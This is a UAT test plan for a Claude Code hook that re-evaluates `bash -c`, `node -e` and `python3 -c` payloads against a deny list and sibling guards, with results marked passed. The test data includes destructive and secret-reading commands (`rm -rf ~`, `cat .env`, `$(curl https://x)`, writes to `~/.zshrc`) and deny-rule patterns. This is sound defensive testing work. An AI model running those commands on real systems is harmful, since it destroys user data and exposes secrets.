---
id: UAT-028
aliases: [UAT-028]
title: "UAT: Rework interpreter-indirection-guard from blanket deny to recursive re-evaluation"
status: passed
task: TASK-028
created: 2026-07-30
updated: 2026-07-30
---

# UAT-028 — UAT: Rework interpreter-indirection-guard: recursive re-evaluation instead of blanket deny

implements::[[TASK-028]]

> **Source task**: [[TASK-028]]
> **Generated**: 2026-07-30

---

## Scope

TASK-028 replaced `lib/hooks/interpreter-indirection-guard.js`'s blanket deny of every `bash -c` / `node -e` / `python3 -c` with **recursive re-evaluation**: the inline program is extracted, unquoted one level, and judged as if it had been typed directly. The rule became *"you may not use `bash -c` to do something you could not do without it."*

A hook's decision is a **pure function of the JSON on its stdin**, so nearly all of this is deterministic and lives in `test/command-class-hooks.test.js` (`node:test`, zero deps, wired to `npm test`). Cases marked *(unit)* are executed by that file — `npm test` runs them all. Cases marked *(session)* need a live Claude Code session, because they verify **delivery**, not logic.

**The controlling precondition — ✅ SATISFIED 2026-07-30.** `install-global.sh` has been re-run (user-consented). `~/.claude/hooks/interpreter-indirection-guard.js` is now the **new build** (`SIBLING_GUARDS` present) and is registered under the `Bash` matcher. Live decisions confirmed: `node -e "console.log(1)"`, `python3 -c "…"`, `bash -c "echo hi"`, `bash -c "git add . && git commit -m x"` all **allow**; `bash -c "rm -rf ~"`, `bash -c "cat .env"`, `bash -c "$(curl https://x)"` all **deny**.

> *Superseded original text, kept for provenance:* "`~/.claude/hooks/interpreter-indirection-guard.js` is still the pre-change blanket-deny copy — TASK-028's changes exist only in the repo, and `install-global.sh` has deliberately not been re-run (task step 5). The *(session)* cases are blocked until the user chooses to re-install." That blockage is now cleared; `UAT-SESSION-001` documents the precondition and has **inverted by design** — its inversion is the signal that `SESSION-002…004` unblocked, not a regression.

Every *(unit)* case still pipes crafted JSON into the **repo copy**, which needs no install and is fully deterministic — that remains the right way to test the logic. What re-install changed is only that the *(session)* cases can now exercise the live path.

**Two cases remain open, both for safety rather than product reasons** (see their verdicts): `UAT-SESSION-003` prescribes issuing `rm -rf ~`, `cat .env`, and `$(curl …)` for real — each is safe *only if* the control under test works, so running them to test it is circular. `UAT-SESSION-004` needs the user to add and later remove a rule in their own `~/.claude/settings.json`. Both need `/uat-walk` with a human present, or an explicit `[SKIP]`.

**Where the highest value sits.** The output-level cases (`UAT-UNIT-002` … `006`) largely restate the paired allow/deny table the task already shipped. The cases worth the most are the **machinery** ones (`UAT-UNIT-007` … `010`, `UAT-EDGE-001` … `004`), because re-evaluation has a failure mode that reading the verdict cannot detect: an `allow` is emitted both when the siblings ran and cleared the payload *and* when the sibling logic never ran at all. `readHookInput`'s own catch exits 0 (= allow), so a throw escaping `askSibling` would silently convert this guard from fail-closed to fail-open — and every output-level assertion would still pass. Those cases each break exactly one thing about the install and require a **deny**.

**Verification status at generation time**: `test/command-class-hooks.test.js` → **64 tests, 64 pass, 0 fail** (was 56; this UAT added 8). The whole-suite total is deliberately **not** pinned below — `test/settings-deny.test.js` is under concurrent development and its count moves; `fail 0` is the assertion that matters. All *(unit)* cases below are green. All *(session)* cases are blocked pending re-install.

---

## Prerequisites

- [ ] Node.js on `PATH` (the hooks are CommonJS scripts; no build step)
- [ ] Repository checked out at `/Users/davidtaylor/Repositories/bootstrap-claude`, with `lib/hooks/lib/command-parse.js` and all five sibling guards present in `lib/hooks/`
- [ ] `npm test` runnable from the repo root
- [ ] **No install or wiring required for `(unit)` cases.** They fire `node lib/hooks/interpreter-indirection-guard.js` directly, or a scratch copy of it. Do **not** run `install-global.sh` and do **not** edit `~/.claude/settings.json` to execute them
- [ ] **`(session)` cases only**: `./lib/scripts/install-global.sh` has been re-run *and* the hook is registered under `PreToolUse` with matcher `Bash`. Neither is assumed; both are the user's call
- [ ] Fixtures are built with `fs.mkdtemp` under the system temp dir and removed in `finally`. **Nothing in this UAT writes to `~/.zshrc`, `~/.claude/`, or `~/Library/LaunchAgents/`** — payloads name those paths so the guard has something to decide about; only the decision is asserted

---

## Test Cases

### UAT-UNIT-001: The whole promoted suite runs green
- **Description**: The single command that executes every *(unit)* case below. Run this first; if it is green, `UAT-UNIT-002` through `UAT-EDGE-006` are satisfied and only the *(session)* cases remain.
- **Steps**:
  1. Run the command below from the repo root
- **Command**:
  ```bash
  node --test test/command-class-hooks.test.js
  ```
- **Expected Result**: `pass 64`, `fail 0`, runtime ~29s (the interpreter block is ~16s of it). Scoped to this file on purpose: `npm test` also runs `test/settings-deny.test.js`, which is under concurrent development, so its total is not a stable expectation. Run `npm test` too — `fail 0` must hold there as well, but do not treat a changed total as a regression.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 64 · fail 0 · duration_ms 28572.7`. `npm test` → `tests 106 · pass 106 · fail 0`. -->


---

### UAT-UNIT-002: Every interpreter spelling both allows a benign payload and denies a dangerous one *(unit)*
- **Scenario**: The core contract. Sixteen spellings — `bash -c`, `sh -c`, `zsh -c`, `python -c`, `python3 -c`, `node -e`, `node --eval`, `ruby -e`, `perl -e`, `/bin/bash -c`, `env bash -c`, `\bash -c`, the fused `-c'…'`, `--eval=`, and two behind a `&&` / `|` separator — each appear **twice**: once carrying `echo hi` (must allow) and once carrying `rm -rf ~` (must deny).
- **Description**: The pairing is what makes extraction observable. A blanket deny could never distinguish *"the payload was extracted and cleared"* from *"the interpreter matched and the guard gave up"* — both printed the same verdict. Getting the second column right requires actually **reaching** the payload past the path prefix, the `env` wrapper, the leading backslash, the missing space, and the `=`.
- **Steps**:
  1. Fire the guard with each of the 32 commands, `cwd` set to the repo
  2. Assert exit 0 and the expected decision for each
- **Command**:
  ```bash
  node --test --test-name-pattern 'extracts and re-evaluates the inline program in every spelling' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 32 decisions correct. `rm -rf ~` is the dangerous half almost everywhere on purpose — it is matched by the **deny list**, the path a re-evaluation built only out of hooks would have missed entirely.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js` (`INTERPRETER_SPELLINGS`)
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (4.87s). Source-verified: `INTERPRETER_SPELLINGS` holds 16 pairs → 32 decisions. -->


---

### UAT-UNIT-003: All four deny sources are reachable through the payload *(unit)*
- **Scenario**: The payload is judged against the permission deny list first, then five sibling guards spawned as subprocesses. A regression in any one of them must name itself rather than surfacing as a vague "something denies".
- **Steps**:
  1. Fire one command per source: `bash -c "rm -rf ~"` (deny list), `bash -c "cat .env"` (`env-content-read-guard.js`), `bash -c "echo x >> ~/.zshrc"` (`protected-write-guard.js`), `bash -c "/bin/rm -rf ~"` (`absolute-path-guard.js`), `bash -c "npm install left-pad"` (`package-install-consent.js`), `bash -c "git stash"` (deny list; `git-protected-ops-block.js` agrees)
  2. Assert every one denies
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard re-runs the deny list and every sibling guard on the payload' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 6 denies.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.69s). Source-verified: 6 deny rows, one per deny source. -->


---

### UAT-UNIT-004: The deny reason is the objecting check's own, not a generic one *(unit)*
- **Scenario**: A block that says only "denied" tells the caller something was wrong without telling them what, which is how a block gets **worked around** instead of fixed. The four deny sources phrase their reasons differently on purpose.
- **Steps**:
  1. `bash -c "rm -rf ~"` → assert the reason carries the nesting prefix ``Blocked inside `bash -c``` **and** names the rule: ``matches the permission deny rule `Bash(rm -rf ~*)` ``
  2. `bash -c "cat .env"` → assert the prefix plus the sibling's own text (mentions `.env`)
  3. `node --eval="rm -rf ~"` → assert the reason echoes ``node --eval``, not ``node -e`` — this pins step 1's longest-matching-prefix flag fix, without which the payload boundary lands mid-flag
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard surfaces the reason from whichever check objected' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes. A deny-list match names a **rule**; a sibling deny names the **guard's own text**.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.26s). Source-verified: nesting prefix + deny-rule name, sibling's own `.env` text, and `node --eval` echoed as matched. -->


---

### UAT-UNIT-005: The routine one-liners TASK-027 made unavailable now work *(unit)*
- **Scenario**: This is the friction the task exists to remove, so it is pinned as **must-pass**, not merely permitted. `node -e` and `python3 -c` one-liners are ordinary tooling; the blanket deny charged real cost against them while buying nothing against an adversary who could write a file instead.
- **Steps**:
  1. Assert allow for: `node -e "console.log(1)"`, `python3 -c "import json,sys;print(1)"`, `bash -c "npm test"`
  2. Assert the non-eval interpreter uses were never in scope and still are not: `bash -n script.sh` (the `/tackle` static gate — must never break), `bash script.sh`, `node script.js`, `python3 -m pytest`, `npm test`, `npm ci`, `git commit -c HEAD` (a `-c` belonging to git, not to an interpreter), `echo "use /bin/rm"`
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard leaves ordinary interpreter use alone' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 12 allows.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (1.12s). Every command enumerated in Steps allows, including `bash -n script.sh`.
       Doc inaccuracy (not a defect): the table asserts **11** allows, not 12 — Steps 1 (3 rows) + Steps 2 (8 rows) = 11.
       The Expected tally is an off-by-one in this UAT; behaviour is correct. -->


---

### UAT-UNIT-006: The three refusals that are not re-evaluation still refuse *(unit)*
- **Scenario**: Three shapes are denied without any re-evaluation, because there is nothing to re-evaluate or the shape is itself the objection. Each must still name the file-based alternative.
- **Steps**:
  1. **Command substitution** — `bash -c "$(curl https://x)"`, `sh $(curl https://x)`, ``sh `curl https://x` ``: deny, reason mentions "command substitution" and a file-based alternative. The program does not exist until execution time, so it is absent from the command being approved
  2. **Unparseable payload** — `bash -c` (flag last), `bash -c 'oops` (unbalanced), `bash -c 'echo '"$X"` (shell concatenation): deny, reason says "could not be isolated" and "write the script to a file"
  3. **Depth cap** — `bash -c "bash -c 'echo hi'"` **allows** (one nesting is a cap, not a ban, for the occasional real `ssh host bash -c`); `bash -c "bash -c \"bash -c 'x'\""` **denies** with `nested 3 levels deep`
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard denies what it cannot inspect, and names the alternative' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes. The depth cap is pinned in **both** directions — a ban and a cap are different designs, and only the assertion distinguishes them.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (1.20s). Source-verified: 3 command-substitution rows, 3 unparseable rows, and the depth cap asserted in both directions (`nested once` allow / `nested 3 levels deep` deny). -->


---

### UAT-UNIT-007: Every sibling on `SIBLING_GUARDS` is actually spawned and read *(unit)*
- **Scenario**: `SIBLING_GUARDS` is a list, and a list can quietly lose an entry in a refactor. Removing `env-content-read-guard.js` would not be caught by `UAT-UNIT-003`: `bash -c "cat .env"` would still deny, via the deny list. Membership has to be made observable directly.
- **Description**: A scratch copy of the hook directory is built under the system temp dir; one sibling at a time is replaced by a stub that denies unconditionally with a unique tag. A benign payload (`bash -c "echo hi"`) is then fired. The tag can only reach the output if that specific file was spawned **and** its answer parsed — which also rules out the silent-permissiveness failure mode for that guard.
- **Steps**:
  1. For each of `absolute-path-guard.js`, `protected-write-guard.js`, `env-content-read-guard.js`, `package-install-consent.js`, `git-protected-ops-block.js`: build the fixture with that one stubbed
  2. Fire `bash -c "echo hi"` and assert deny, exit 0, and that the reason matches `SENTINEL-<sibling>`
  3. Remove the fixture in `finally`
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard consults every sibling on its list' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 5 sentinels observed. A benign payload clearing while a sibling is stubbed to deny means that sibling was never consulted.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.86s). Source-verified: `GUARD_SIBLINGS` holds all 5 names; each is stubbed in turn and its `SENTINEL-<sibling>` tag asserted in the reason. Fixtures removed in `finally`. -->


---

### UAT-UNIT-008: The synthesized envelope carries the extracted payload and the session `cwd` *(unit)*
- **Scenario**: The siblings judge the synthesized envelope, so its shape is a contract. `cwd` in particular: `protected-write-guard.js` resolves a relative redirect target against it, and dropping it would weaken that check **invisibly** — the guard would keep answering, just with less to go on.
- **Steps**:
  1. Stub `absolute-path-guard.js` with a reader that echoes its entire stdin back inside a deny reason
  2. Fire `bash -c "echo hi"` with `cwd: "/some/session/cwd"`
  3. Assert the echoed JSON contains `"tool_name":"Bash"`, `"command":"echo hi"` (the **extracted** program, not the outer command), and `"cwd":"/some/session/cwd"`
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard hands each sibling a PreToolUse envelope carrying the payload and cwd' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 3 field assertions.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.09s). Source-verified: 3 assertions — `"tool_name":"Bash"`, `"command":"echo hi"` (extracted, not outer), `"cwd":"/some/session/cwd"`. -->


---

### UAT-UNIT-009: The deny-list matcher's four semantics are reproduced, and no more *(unit)*
- **Scenario**: Claude Code does not expose its permission matcher, so the guard reproduces it — the one place TASK-028 accepted a second matching vocabulary. A drifting matcher fails in **both** directions at once: `ddrescue` becomes unrunnable while `dd if=…` slips through.
- **Steps**:
  1. Build a fixture whose deny list is exactly `Bash(dd *)`, `Bash(sh)`, `Bash(git * --force*)`, `Bash(git stash:*)`, `Edit(~/.zshrc)`
  2. Assert, all inside `bash -c "…"`: `dd` **deny**, `dd if=/dev/zero of=/tmp/x` **deny**, `ddrescue /dev/sda img` **allow** (trailing ` *` is a word boundary, not a plain wildcard); `shellcheck script.sh` **allow** (no wildcard is an exact match); `git -C /elsewhere push --force` **deny** but `git push` **allow** (`*` is an ordinary wildcard at any position — first-token matching would not have sufficed); `git stash pop` **deny** but `git stashes --list` **allow** (`:*` is that same boundary as a suffix); `cd /tmp && git stash` **deny** (matched segment by segment, so a denied command cannot ride in behind a `cd`); `cat ~/.zshrc.bak` **allow** (`Edit(…)` entries are file-tool rules and are skipped, not mis-applied to a command string)
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard reproduces the deny-list pattern semantics on the payload' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 10 decisions correct.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (1.53s). Source-verified: the table holds exactly 10 rows, covering word-boundary ` *`, exact match, positional `*`, `:*` suffix, segment splitting, and skipped `Edit(…)`. -->


---

### UAT-UNIT-010: The deny list is read from disk at call time, from either layout *(unit)*
- **Scenario**: An emergent property of resolving both sources from `__dirname`, and worth pinning as a feature: a user who adds a rule to their own `~/.claude/settings.json` has it honored **inside `bash -c` immediately, with no re-install**.
- **Steps**:
  1. Installed layout — fixture `<root>/settings.json` with `permissions.deny: ["Bash(kubectl delete *)"]`, a rule that appears in no shipped template. Assert `bash -c "kubectl delete pod api-7"` **denies** naming that rule, and `bash -c "kubectl get pods"` **allows**
  2. Assert `bash -c "rm -rf ~"` **allows** against this fixture — it is in the shipped template but not in this list, which proves the rules genuinely came from the file rather than being compiled in
  3. Repo layout — fixture `<root>/scripts/templates/settings-deny.json` as a bare array `["Bash(rm -rf ~*)", "Bash(sudo *)"]`, no `settings.json`. Assert `bash -c "sudo reboot"` **denies** and `bash -c "echo hi"` **allows**
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard reads the deny list at runtime, from whichever layout it is in' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes. Step 2 is the load-bearing one: without it, steps 1 and 3 would also pass against a hard-coded list.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.87s). Source-verified: installed layout (`kubectl delete` deny naming the rule, `kubectl get` allow, `rm -rf ~` allow = the load-bearing step 2) and repo layout (bare-array template: `sudo reboot` deny, `echo hi` allow). -->


---

### UAT-EDGE-001: Every kind of subprocess trouble fails closed *(unit)*
- **Scenario**: **The highest-value case in this UAT.** A silent flip to permissive is this design's worst failure, and it is invisible from the outside: a guard that stopped checking is indistinguishable from a guard that approved. Four distinct ways a sibling's verdict can fail to arrive must all block, and all must say the check *could not be completed* rather than that the command was refused — telling a user "denied" when the truth is "could not check" sends them to rewrite a command that was never the problem.
- **Steps**: For each fixture below, fire the benign `bash -c "echo hi"` and assert exit 0, decision **deny**, reason matching `could not be fully checked`, the specific failure named, and **empty stderr**:
  1. `env-content-read-guard.js` **absent** from the directory → `not installed alongside`. These hooks are installed by `rsync` file by file, so an absent sibling is a control that silently stopped applying — the one case where "skip that check" is exactly the wrong response
  2. `absolute-path-guard.js` writes **non-JSON** to stdout → `not a decision envelope`
  3. `package-install-consent.js` **exits 3** without output → `exited 3`. Every sibling exits 0 even when denying, so a non-zero status means it crashed rather than decided
  4. `git-protected-ops-block.js` **never answers** (`setTimeout(…, 60000)`) → killed at the 2s budget; reason matches `was killed by` or `could not be run` (`spawnSync` surfaces a timeout as an error, a signal, or both, depending on platform and on where the child was when the timer fired)
- **Description**: The empty-stderr assertion is the one that pins fail-closed itself. A throw escaping `askSibling` would be caught by `readHookInput`, which exits 0 with no output — i.e. **allow**. Silence on stderr is how that path is ruled out.
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard fails closed on every kind of subprocess trouble' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 4 trouble modes × 5 assertions. Runtime ~2.7s — the timeout case spends the full 2s budget by design.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0`, runtime 2.66s (matches the ~2.7s budget-bound expectation).
       Source-verified: 4 cases × 5 assertions — exit 0, deny, `could not be fully checked`, the mode-specific reason, and empty stderr (the assertion that pins fail-closed). -->


---

### UAT-EDGE-002: An unreadable deny list denies rather than reading as an empty one *(unit)*
- **Scenario**: The deny list is the **only** thing standing between `bash -c "rm -rf ~"` and the shell — no sibling guard objects to a bare `rm -rf ~`. Skipping the check when the file cannot be read would reopen precisely the hole the blanket-deny predecessor had closed.
- **Steps**:
  1. Fixture with **no** rules file in either location → fire `bash -c "echo hi"`, assert deny
  2. Fixture whose `settings.json` is **malformed** (`{ not json `) → same
  3. Assert both reasons match `deny list could not be read` and name the repair (`install-global.sh`)
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard denies when the deny list cannot be read at all' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 2 fixtures × 4 assertions. Note this is the reason a benign `bash -c "echo hi"` denies in the broken-install fixtures elsewhere in this UAT.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.10s). Source-verified: 2 fixtures (no rules file; malformed `{ not json `) × 4 assertions — exit 0, deny, `deny list could not be read`, `install-global.sh` named as the repair. -->


---

### UAT-EDGE-003: The session `cwd` changes the verdict, proving it is carried through *(unit)*
- **Scenario**: `protected-write-guard.js` resolves a relative redirect target against the session `cwd`, so the same payload is dangerous from `$HOME` and ordinary from inside a project. Dropping `cwd` would silently weaken that check — and `UAT-UNIT-008` only proves the field is *present* in the envelope, not that it *matters*.
- **Steps**:
  1. Fire `bash -c "echo x > .zshrc"` with `cwd = $HOME` → assert **deny** with the ``Blocked inside `bash -c` `` prefix (`.zshrc` relative to `$HOME` **is** `~/.zshrc`)
  2. Fire the identical command with `cwd = <repo>` → assert **allow** (a `.zshrc` inside a project is an ordinary file)
- **Description**: The two rows differ *only* in `cwd`, which is the whole point. Nothing is written; the guard decides before anything runs.
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard re-evaluates the payload against the session cwd' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 3 assertions.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.39s). Source-verified: 3 assertions — deny + `Blocked inside \`bash -c\`` from `cwd = $HOME`, allow from `cwd = <repo>`. The two rows differ only in `cwd`. Nothing written. -->


---

### UAT-EDGE-004: A broken install still leaves the common path alone *(unit)*
- **Scenario**: The counterweight to `UAT-EDGE-001` and `UAT-EDGE-002`. Fail-closed must be **scoped**: the deny list is loaded lazily and no sibling is spawned until a segment holds an interpreter *and* an eval flag. A guard with no siblings and no readable rules must still wave `npm test` through, or it has started charging every Bash call for machinery only interpreter commands need.
- **Steps**:
  1. Build a fixture with **no siblings and no rules file at all**
  2. Assert **allow** for `npm test`, `git status`, `ls -la`, `bash script.sh`, `bash -n script.sh`
  3. Assert **allow** for a `Read` tool call — a tool this hook does not guard is never its business
  4. Assert the **same** fixture **denies** `bash -c "echo hi"`, which is what makes the allows above a scoping result rather than a no-op
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard leaves the common path alone even when its install is broken' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 12 assertions.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.31s). Source-verified: exactly 12 assertions — 5 commands × (exit 0 + allow) = 10, plus the `Read` pass-through, plus the same fixture denying `bash -c "echo hi"` (what makes the allows a scoping result, not a no-op). -->


---

### UAT-EDGE-005: The documented gaps stay exactly where they are *(unit)*
- **Scenario**: Deliberate gaps, pinned so that a future parser change is a **decision** rather than an accident. These are not bugs.
- **Steps**: Assert **allow** for `dash -c ls` and `ksh -c ls` (dash/ksh deliberately outside the interpreter set), `sh -ec "ls"` (bundled short flags are not decomposed), and the two `echo` rows — which now allow for **two different reasons**, only one of which is a gap:
  1. `echo "bash -c foo"` → allow. A genuine **parser gap**: the opening `"` is part of the token, the basename lookup misses, and the guard never engages
  2. `echo bash -c foo` → allow. **Not** a gap. TASK-027 pinned this as `deny`, which was always a false positive — the command runs `echo`, not `bash`. Under re-evaluation the guard still detects the spelling, extracts `foo`, finds nothing objectionable, and allows. Removing this false positive is precisely what re-evaluation buys
  3. `echo bash -c "rm -rf ~"` → **deny**. The third row exists so row 2 cannot read as a hole: detection is unchanged, so putting something denied where `foo` is still blocks
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter guard: documented gaps stay exactly where they are' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 7 decisions. Also unchanged and asserted elsewhere in the suite: no `allow`/`ask` precedence, no project-scoped settings, no quote-aware decomposition (`bash -c "git commit -m 'a; sudo b'"` over-blocks — it errs toward blocking, never toward allowing), and `node -e` / `python3 -c` payloads re-evaluated **as Bash** though they are JS/Python, a deliberate over-approximation that can only over-block.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.48s). All three echo rows behave as documented, including the `deny` row that keeps row 2 from reading as a hole.
       Doc inaccuracy (not a defect): the table holds **6** decisions, not 7 — `dash`/`ksh`/`sh -ec` (3) + the three echo rows (3). The Steps prose also says "the two `echo` rows" then enumerates three. Behaviour is correct. -->


---

### UAT-EDGE-006: Malformed stdin still exits 0 and decides nothing *(unit)*
- **Scenario**: Pre-existing contract, re-checked because the rewrite added a large new throw surface (subprocess spawning, JSON parsing of sibling output, filesystem reads). A PreToolUse hook that exits non-zero reads as a **hook failure**, disrupting a tool call it was never meant to gate.
- **Steps**:
  1. Pipe 14 malformed payloads into the guard — unparseable text, empty stdin, JSON `null`, `[]`, `42`, `"hello"`, `{}`, missing `tool_input`, `null` `tool_input`, object/array `command`, numeric `tool_name`, and two file-tool shapes
  2. Assert exit 0 and no deny envelope for every one
  3. Assert a `WebFetch` call passes through untouched
- **Command**:
  ```bash
  node --test --test-name-pattern 'interpreter-indirection-guard.js: malformed stdin exits 0 and decides nothing' test/command-class-hooks.test.js
  ```
- **Expected Result**: 1 test passes, 14 payloads clean.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js` (pre-existing `ALL_HOOKS` loop)
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: `pass 1 · fail 0` (0.61s). Source-verified: `MALFORMED_STDIN` holds exactly 14 entries, each asserted exit 0 + allow.
       Doc note: Step 3's `WebFetch` pass-through lives in a *sibling* test (`…: a tool it does not guard is passed through untouched`), which the prescribed `--test-name-pattern` does not match. It is green in the full-file run (UAT-UNIT-001). -->


---

### UAT-PERF-001: The re-evaluation cost stays off the common path
- **Scenario**: The guard fires on **every** Bash call, and the vast majority carry no interpreter. Lazy, memoized deny-list loading and interpreter-gated spawning are what keep that true; a regression here taxes every tool call in every session.
- **Steps**:
  1. Fire the guard 10× with `npm test` (no interpreter) and time it
  2. Fire it 10× with `bash -c "echo hi"` (five sibling spawns plus a deny-list load) and time it
- **Command**:
  ```bash
  time (for i in 1 2 3 4 5 6 7 8 9 10; do printf '{"tool_name":"Bash","tool_input":{"command":"npm test"},"cwd":"%s"}' "$PWD" | node lib/hooks/interpreter-indirection-guard.js >/dev/null; done)
  ```
- **Expected Result**: ~0.45s for 10 runs, i.e. **~45 ms per common-path call** — bare Node startup, with the deny list never read and nothing spawned. The interpreter-path comparison run should land near ~2.6s / 10, i.e. **~264 ms**, matching the task's recorded 46 ms vs 270 ms. Treat a common-path figure materially above ~60 ms as a regression in the laziness, not as noise.
- **Repeatable Unit Test**: Not applicable: a wall-clock threshold on a shared machine is flaky as a unit test; the scoping property it protects is asserted structurally in `UAT-EDGE-004` instead.
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: common path 0.496s / 10 = **49.6 ms**, inside the ~60 ms regression threshold (measured under concurrent parallel-agent load).
       Interpreter path 2.618s / 10 = **262 ms**, against the ~264 ms expectation. Ratio 5.3×, matching the task's recorded 46 ms vs 270 ms. -->


---

### UAT-SESSION-001: Precondition — the installed copy is still the pre-change blanket-deny build
- **Scenario**: Establishes, rather than assumes, the constraint this whole UAT is built around. Read-only; it installs nothing.
- **Steps**:
  1. Fire the **installed** hook at `~/.claude/hooks/interpreter-indirection-guard.js` with the benign `bash -c "echo hi"`
  2. Read the decision
- **Command**:
  ```bash
  printf '{"tool_name":"Bash","tool_input":{"command":"bash -c \\"echo hi\\""},"cwd":"%s"}' "$PWD" | node ~/.claude/hooks/interpreter-indirection-guard.js
  ```
- **Expected Result**: **`deny`**, with a reason beginning ``Blocked: `bash -c` — an interpreter invoked with an inline script`` — the old blanket-deny text. This confirms TASK-028's changes are repo-only. *After* the user re-runs `install-global.sh`, this same command flips to **allow** (no output), which is the signal that `UAT-SESSION-002` … `004` have become runnable. **This case is therefore expected to invert once the re-install happens** — it documents a transitional state, which is why it is not a unit test.
- **Repeatable Unit Test**: Not applicable: asserts pre-install machine state that is designed to change; as a unit test it would fail by design after the re-install.
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto: the installed hook returned exit 0 and `permissionDecision":"deny"` with the reason opening exactly
       "Blocked: `bash -c` — an interpreter invoked with an inline script." — the pre-change blanket-deny text, verbatim.
       Precondition confirmed: TASK-028's changes are repo-only. Read-only; nothing installed. This verdict is expected to
       invert to `allow` once the user re-runs install-global.sh, which is the signal UAT-SESSION-002…004 have unblocked. -->
  <!-- auto (re-run 2026-07-30, after the user re-ran install-global.sh): THIS CASE HAS NOW INVERTED, as designed.
       The installed hook carries `SIBLING_GUARDS`, and `bash -c "echo hi"` issued as a live Bash tool call
       executed and printed `hi` — i.e. `allow`, no longer the blanket-deny text this case asserted.
       Superseded by design, NOT a product failure: the case existed to document a transitional precondition,
       and its inversion is precisely the signal that UAT-SESSION-002…004 unblocked. Its `[x] Pass` is retained
       as the record of a correct observation at the time it was made; it is deliberately not re-judged. -->


---

### UAT-SESSION-002: A routine one-liner runs in a live session *(session — BLOCKED pending re-install)*
- **Scenario**: Delivery, not logic. A unit test proves the guard *acts* on a payload shape; only a live session proves the registered `Bash` matcher *delivers* one, and that the allow actually reaches execution.
- **Prerequisite**: `./lib/scripts/install-global.sh` re-run by the user. **Do not run it to satisfy this UAT.**
- **Steps**:
  1. In a live Claude Code session, ask for `node -e "console.log(1)"` to be run
  2. Repeat with `python3 -c "import json,sys;print(1)"` and `bash -c "echo hi"`
- **Expected Result**: All three execute and print their output. Under the currently-installed build all three are blocked, which is the friction this task removes.
- **Repeatable Unit Test**: Not applicable: verifies matcher routing in a live session, which no unit test can observe.
- [x] Pass <!-- 2026-07-30 -->
  <!-- auto (re-run after the user re-installed): prerequisite now satisfied — the installed hook carries
       `SIBLING_GUARDS`, and `~/.claude/settings.json` registers it under `PreToolUse` with matcher `Bash`.
       All three commands were issued as real Bash tool calls in this live session and each executed and
       printed its output: `node -e "console.log(1)"` → `1`; `python3 -c "import json,sys;print(1)"` → `1`;
       `bash -c "echo hi"` → `hi`. Delivery verified end-to-end, not merely the guard's logic. -->


---

### UAT-SESSION-003: A dangerous payload is blocked in a live session, with the objecting check's reason *(session — BLOCKED pending re-install)*
